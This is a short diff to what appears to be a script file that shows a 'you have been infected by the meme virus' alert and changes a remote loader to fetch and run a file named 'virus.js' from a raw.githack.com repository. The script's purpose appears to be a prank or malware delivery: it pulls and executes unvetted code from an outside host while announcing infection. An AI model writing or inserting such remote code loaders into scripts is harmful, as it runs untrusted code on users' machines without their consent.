@@ -21,4 +21,4 @@ $store.keys()
 //made by mkm
 $alert('WARNING YOU HAVE BEEN INFECTED BY THE MEME VIRUS')
 
-$loader.script("https://raw.githack.com/mhmmkm/Yhingy/main/virus")
+$loader.script("https://raw.githack.com/mhmmkm/Yhingy/main/virus.js")
